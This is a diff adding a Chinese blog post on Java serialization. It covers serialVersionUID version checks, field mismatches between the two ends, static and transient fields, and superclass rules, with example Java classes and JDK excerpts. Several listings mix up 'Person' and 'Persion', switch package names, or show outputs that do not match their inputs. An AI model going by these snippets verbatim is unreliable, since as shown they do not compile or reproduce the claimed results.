@@ -77,6 +77,331 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-4.27.序列化与反序列化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/06/30/4.27.%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
+  <time class="dt-published" datetime="2021-06-30T00:55:09.000Z" itemprop="datePublished">2021-06-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/06/30/4.27.%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">序列化与反序列化</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>实现Serializable接口的目的是为类可持久化，比如在网络传输或本地存储，为系统的分布和异构部署提供先决条件。serialVersionUID其实是验证版本一致性的</p>
+<p>若没有序列化，现在我们所熟悉的远程调用，对象数据库都不可能存在，serialVersionUID适用于java序列化机制。简单来说，JAVA序列化的机制是通过 判断类的serialVersionUID来验证的版本一致的。在进行反序列化时，JVM会把传来的字节流中的serialVersionUID于本地相应实体类的serialVersionUID进行比较。如果相同说明是一致的，可以进行反序列化，否则会出现反序列化版本一致的异常，即是InvalidClassException</p>
+<p><strong>具体序列化的过程是这样的：</strong>序列化操作时会把系统当前类的serialVersionUID写入到序列化文件中，当反序列化时系统会自动检测文件中的serialVersionUID，判断它是否与当前类中的serialVersionUID一致。如果一致说明序列化文件的版本与当前类的版本是一样的，可以反序列化成功，否则就失败；</p>
+<p><strong>serialVersionUID有两种显示的生成方式：</strong><br>一是默认的1L，比如：private static final long serialVersionUID = 1L;    </p>
+<p>二是根据包名，类名，继承关系，非私有的方法和属性，以及参数，返回值等诸多因子计算得出的，极度复杂生成的一个64位的哈希字段。基本上计算出来的这个值是唯一的。比如：private static final long serialVersionUID = xxxxL;<br>注意：显示声明serialVersionUID可以避免对象不一致，</p>
+<p>当一个类实现类Serializable接口，如果没有显示定义serialVersionUID，Eclipse会自动给出相应的提醒；面对这种情况，我们只需要在Eclipse中点击类的warning图标，Eclipse就会自动给出两种生成方式。如果不想定义，在Eclipse的设置中也可以把它关掉的，设置如下：<br>Window ==&gt; Preferences ==&gt; Java ==&gt; Compiler ==&gt; Error/Warnings ==&gt; Potential programming problems</p>
+<p>将Serializable class without serialVersionUID的warning改成ignore即可。</p>
+<p>当实现java.io.Serializable接口中没有显示的定义serialVersionUID变量的时候，JAVA序列化机制会根据Class自动生成一个serialVersionUID作序列化版本比较用，这种情况下，如果Class文件(类名，方法明等)没有发生变化(增加空格，换行，增加注释等等)，就算再编译多次，serialVersionUID也不会变化的。</p>
+<p>如果我们不希望通过编译来强制划分软件版本，即实现序列化接口的实体能够兼容先前版本，就需要显示的定义一个serialVersionUID，类型为long的变量。不修改这个变量值的序列化实体，都可以相互进行序列化和反序列化。</p>
+<p>下面用代码说明一下serialVersionUID在应用中常见的几种情况。<br>（1）序列化实体类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo.entity.serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">4359709211352400087L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Long id;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String userName;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(Long id, String name)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        userName = <span class="string">&quot;dddbbb&quot;</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id.toString() + <span class="string">&quot;--&quot;</span> + name.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>（2）序列化功能：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo.entity.serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerialTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        Persion p = <span class="keyword">new</span> Person(<span class="number">1L</span>, <span class="string">&quot;陈俊生&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;person Seria:&quot;</span> + p);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;Persion.txt&quot;</span>);</span><br><span class="line">            ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">            oos.writeObject(p);</span><br><span class="line">            oos.flush();</span><br><span class="line">            oos.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>（3）反序列化功能</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo.entity.serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DeserialTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        Person p;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;Persion.txt&quot;</span>);</span><br><span class="line">            ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">            p = (Persion) ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line">            System.out.println(p.toString());</span><br><span class="line">            System.out.println(p.userName);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>情况一：Person类序列化之后，从A端传到B端，然后在B端进行反序列化，在序列化Persion和反序列化Persion的时候A和B端都需要一个相同的类。如果两处的serialVersionUID不一致，会产生什么样的效果呢。<br>【答案】可以利用上面的代码做个试验来验证：</p>
+<p>先执行测试类SerialTest，生成序列化文件，代表A端序列化后的文件，然后修改serialVersion值，再执行测试类DeserialTest，代表B端使用不同serialVersion的类去反序列化，结果报错:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">java.io.InvalidClassException: com.example.demo.entity.serializable.Persion; local class incompatible: stream classdesc serialVersionUID = 4359709211352400087, local class serialVersionUID = 4359709211352400082</span><br><span class="line">	at java.io.ObjectStreamClass.initNonProxy(ObjectStreamClass.java:<span class="number">616</span>)</span><br><span class="line">	at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:<span class="number">1843</span>)</span><br><span class="line">	at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:<span class="number">1713</span>)</span><br><span class="line">	at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:<span class="number">2000</span>)</span><br><span class="line">	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:<span class="number">1535</span>)</span><br><span class="line">	at java.io.ObjectInputStream.readObject(ObjectInputStream.java:<span class="number">422</span>)</span><br><span class="line">	at com.example.demo.entity.serializable.DeserialTest.main(DeserialTest.java:<span class="number">22</span>)</span><br></pre></td></tr></table></figure>
+
+<p>情况二：假设两处serialVersionUID一致，如果A端增加一个字段，然后序列化，而B端不变，然后反序列化，会是什么情况呢?</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo.entity.serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">4359709211352400082L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Long id;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(Long id, String name, <span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id.toString() + <span class="string">&quot;--&quot;</span> + name.toString() + <span class="string">&quot;age:&quot;</span> + age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo.entity.serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerialTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        Person p = <span class="keyword">new</span> Person(<span class="number">1L</span>, <span class="string">&quot;陈俊生&quot;</span>, <span class="number">100</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;person Seria:&quot;</span> + p);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;Persion.txt&quot;</span>);</span><br><span class="line">            ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">            oos.writeObject(p);</span><br><span class="line">            oos.flush();</span><br><span class="line">            oos.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Person DeserialPerson:1–陈俊生</p>
+<p><strong>【答案】</strong>新增 public int age; 执行SerialTest，生成序列化文件，代表A端。删除 public int age，反序列化，代表B端，最后的结果为：执行序列化，反序列化正常，但是A端增加的字段丢失(被B端忽略)。</p>
+<p>情况三：假设两处serialVersionUID一致，如果B端减少一个字段，A端不变，会是什么情况呢?</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo.entity.serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">4359709211352400082L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Long id;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"><span class="comment">//    public int age;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Persion</span><span class="params">(Long id, String name)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line"><span class="comment">//        this.age = age;</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Persion:&quot;</span>+id.toString() + <span class="string">&quot;name:&quot;</span> + name.toString() ;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Person DeserialPerson: 1234,age:0</p>
+<p>【答案】序列化，反序列化正常，B端字段少于A端，A端多的字段值丢失(被B端忽略)。</p>
+<p>情况四： 假设两处serialVersionUID一致，如果B端增加一个字段，A端不变，会是什么情况呢?<br>验证过程如下：<br>先执行SerialTest，然后在实体类Person增加一个字段age，如下所示，再执行测试类DeserialTest.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sf.code.serial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1234567890L</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(<span class="keyword">int</span> id, String name)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*public Person(int id, String name, int age) &#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        this.id = id;</span></span><br><span class="line"><span class="comment">        this.name = name;</span></span><br><span class="line"><span class="comment">        this.age = age;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person: &quot;</span> + id </span><br><span class="line">                + <span class="string">&quot;,name:&quot;</span> + name </span><br><span class="line">                + <span class="string">&quot;,age:&quot;</span> + age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>结果：Person DeserialPerson: 1234,name:wang,age:0<br>说明序列化，反序列化正常，B端新增加的int字段被赋予了默认值0。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo.entity.serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.weaver.ast.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestStatic</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> staticVar = <span class="number">5</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 初始时staticVar为5</span></span><br><span class="line">            ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;result.obj&quot;</span>));</span><br><span class="line">            out.writeObject(<span class="keyword">new</span> TestStatic());</span><br><span class="line">            out.close();</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 序列化后修改为10</span></span><br><span class="line">            TestStatic.staticVar = <span class="number">10</span>;</span><br><span class="line">            ObjectInputStream oin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;result.obj&quot;</span>));</span><br><span class="line">            TestStatic t = (TestStatic) oin.readObject();</span><br><span class="line">            oin.close();</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 再读取，通过t.staticVar打印新的值</span></span><br><span class="line">            System.out.println(t.staticVar);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>清单 2 中的 main 方法，将对象序列化后，修改静态变量的数值，再将序列化对象读取出来，然后通过读取出来的对象获得静态变量的数值并打印出来。依照清单 2，这个 System.out.println(t.staticVar) 语句输出的是 10 还是 5 呢？</p>
+<p>最后的输出是 10，对于无法理解的读者认为，打印的 staticVar 是从读取的对象里获得的，应该是保存时的状态才对。之所以打印 10 的原因在于序列化时，并不保存静态变量，这其实比较容易理解，序列化保存的是对象的状态，静态变量属于类的状态，因此 序列化并不保存静态变量。</p>
+<h3 id="父类的序列化与-Transient-关键字"><a href="#父类的序列化与-Transient-关键字" class="headerlink" title="父类的序列化与 Transient 关键字"></a>父类的序列化与 Transient 关键字</h3><p>情境：一个子类实现了 Serializable 接口，它的父类都没有实现 Serializable 接口，序列化该子类对象，然后反序列化后输出父类定义的某变量的数值，该变量数值与序列化时的数值不同。</p>
+<p>解决：要想将父类对象也序列化，就需要让父类也实现Serializable 接口。如果父类不实现的话的，就 需要有默认的无参的构造函数。在父类没有实现 Serializable 接口时，虚拟机是不会序列化父对象的，而一个 Java 对象的构造必须先有父对象，才有子对象，反序列化也不例外。所以反序列化时，为了构造父对象，只能调用父类的无参构造函数作为默认的父对象。因此当我们取父对象的变量值时，它的值是调用父类无参构造函数后的值。如果你考虑到这种序列化的情况，在父类无参构造函数中对变量进行初始化，否则的话，父类变量值都是默认声明的值，如 int 型的默认是 0，string 型的默认是 null。</p>
+<p>Transient 关键字的作用是控制变量的序列化，在变量声明前加上该关键字，可以阻止该变量被序列化到文件中，在被反序列化后，transient 变量的值被设为初始值，如 int 型的是 0，对象型的是 null。</p>
+<p>特性使用案例</p>
+<p>我们熟悉使用 Transient 关键字可以使得字段不被序列化，那么还有别的方法吗？根据父类对象序列化的规则，我们可以将不需要被序列化的字段抽取出来放到父类中，子类实现 Serializable 接口，父类不实现，根据父类序列化规则，父类的字段数据将不被序列化。</p>
+<h3 id="static-final-修饰的serialVersionUID如何被写入到序列化文件中的，看下面的源码："><a href="#static-final-修饰的serialVersionUID如何被写入到序列化文件中的，看下面的源码：" class="headerlink" title="static final 修饰的serialVersionUID如何被写入到序列化文件中的，看下面的源码："></a>static final 修饰的serialVersionUID如何被写入到序列化文件中的，看下面的源码：</h3><p>序列化写入时的ObjectStreamClass.java中，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">void writeNonProxy(ObjectOutputStream out) throws IOException &#123;</span><br><span class="line">        out.writeUTF(name);</span><br><span class="line">        out.writeLong(getSerialVersionUID());</span><br><span class="line"></span><br><span class="line">        byte flags &#x3D; 0;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public long getSerialVersionUID() &#123;</span><br><span class="line">    &#x2F;&#x2F; REMIND: synchronize instead of relying on volatile?</span><br><span class="line">    if (suid &#x3D;&#x3D; null) &#123;</span><br><span class="line">        suid &#x3D; AccessController.doPrivileged(</span><br><span class="line">            new PrivilegedAction&lt;Long&gt;() &#123;</span><br><span class="line">                public Long run() &#123;</span><br><span class="line">                    return computeDefaultSUID(cl);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    return suid.longValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images2015.cnblogs.com/blog/285763/201704/285763-20170405104723582-736173583.png" alt="img"></p>
+
+      
+    </div>
+    <footer class="article-footer">
